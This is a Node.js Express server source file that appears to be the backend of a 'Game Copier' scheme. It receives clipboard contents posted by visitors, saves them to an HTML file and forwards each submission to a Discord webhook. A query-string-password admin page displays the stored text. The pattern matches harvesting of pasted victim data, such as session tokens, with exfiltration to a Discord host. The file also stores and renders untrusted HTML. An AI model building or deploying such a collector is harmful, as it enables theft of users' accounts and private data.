require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static('public'));
app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

// Function to send data to Discord webhook
function sendToDiscord(clipboardData) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  if (!webhookUrl) {
    console.error('Discord webhook URL not provided');
    return;
  }

  const payload = JSON.stringify({
    content: "New clipboard data received:",
    embeds: [{
      title: "Clipboard Content",
      description: "```" + clipboardData.substring(0, 1900) + "```", // Discord limit
      color: 0x00ff00,
      timestamp: new Date().toISOString(),
      footer: {
        text: "Game Copier Bot"
      }
    }]
  });

  const url = new URL(webhookUrl);
  const options = {
    hostname: url.hostname,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = https.request(options, (res) => {
    console.log(`Discord webhook response: ${res.statusCode}`);
    res.on('data', (chunk) => {
      console.log('Discord response:', chunk.toString());
    });
  });

  req.on('error', (error) => {
    console.error('Error sending to Discord:', error);
  });

  req.write(payload);
  req.end();
}

app.post('/submit-clipboard', (req, res) => {
  const { clipboardData } = req.body;
  
  // Save to file (existing functionality)
  const savePath = path.join(__dirname, 'data', 'clipboard.html');
  
  // Ensure data directory exists
  const dataDir = path.join(__dirname, 'data');
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
  
  fs.writeFile(savePath, clipboardData, err => {
    if (err) return res.status(500).send('Failed to save clipboard data.');
    
    // Send to Discord webhook
    sendToDiscord(clipboardData);
    
    res.send('Clipboard saved.');
  });
});

app.get('/admin', (req, res) => {
  const provided = req.query.password;
  const correct = process.env.ADMIN_PASSWORD;
  
  if (provided !== correct) return res.status(403).send('Unauthorized');
  
  const dataPath = path.join(__dirname, 'data', 'clipboard.html');
  const content = fs.existsSync(dataPath)
    ? fs.readFileSync(dataPath, 'utf8')
    : 'No clipboard data yet.';
    
  res.render('admin.html', { content });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
